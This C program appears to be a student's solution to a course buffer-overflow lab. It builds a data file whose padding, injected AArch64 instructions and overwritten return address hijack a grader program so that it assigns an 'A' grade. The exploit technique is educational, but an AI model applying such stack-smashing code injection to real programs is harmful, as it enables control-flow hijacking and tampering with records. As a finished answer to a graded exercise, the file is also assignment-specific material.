/*
creates a file named dataA that triggers the grader program to assign an 'A' grade.
the file contains:
1. the student's name followed by a null byte
2. padding bytes to overflow the buffer
3. machine instructions generated by miniassembler functions to set the grade to 'A'
4. an overwritten return address pointing to the injected instructions
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/*
main function behavior:
- accepts no command-line arguments
- does not read from stdin
- does not write to stdout or stderr (except on failure)
- writes crafted data to "dataA" file
- returns 0 on success, non-zero on failure
*/
int main(void) {
    /* define the name to be written, truncated to avoid newlines */
    const char *studentName = "AnishK";
    /* ASCII value for 'A' */
    const unsigned int asciiA = 0x41;

    /* predefined memory addresses based on memorymap analysis */
    unsigned long gradeAddress = 0x420044;       /* address of the grade variable */
    unsigned long instructionAddress = 0x42007c; /* start address for injected instructions */
    unsigned long returnJumpAddress = 0x40089c;  /* address to jump back after attack */

    /* create machine instructions using miniassembler functions */
    unsigned int movInstruction = MiniAssembler_mov(0, asciiA);                      /* mov w0, #A */
    unsigned int adrInstruction = MiniAssembler_adr(1, gradeAddress, instructionAddress + 4); /* adr x1, gradeAddress */
    unsigned int strbInstruction = MiniAssembler_strb(0, 1);                          /* strb w0, [x1] */
    unsigned int branchInstruction = MiniAssembler_b(returnJumpAddress, instructionAddress + 12); /* b returnJumpAddress */

    /* open the dataA file in binary write mode */
    FILE *file = fopen("dataA", "wb");
    if (!file) {
        return 1; /* exit if file cannot be opened */
    }

    /* write the student's name to the file */
    fwrite(studentName, 1, 6, file); /* "AnishK" is 6 bytes */

    /* append a null byte to terminate the name string */
    fputc('\0', file);

    /* add padding to exceed the buffer size (48 bytes total) */
    for (int padding = 0; padding < (48 - 7); padding++) { /* 6 name bytes + 1 null */
        fputc('\0', file);
    }

    /* insert the crafted machine instructions into the file */
    fwrite(&movInstruction, sizeof(movInstruction), 1, file);          /* mov w0, #A */
    fwrite(&adrInstruction, sizeof(adrInstruction), 1, file);          /* adr x1, gradeAddress */
    fwrite(&strbInstruction, sizeof(strbInstruction), 1, file);       /* strb w0, [x1] */
    fwrite(&branchInstruction, sizeof(branchInstruction), 1, file);    /* b returnJumpAddress */

    /* overwrite the return address to point to the start of injected instructions */
    unsigned long fakeReturn = instructionAddress;
    fwrite(&fakeReturn, sizeof(fakeReturn), 1, file);

    /* close the file after writing all data */
    fclose(file);

    return 0; /* indicate successful execution */
}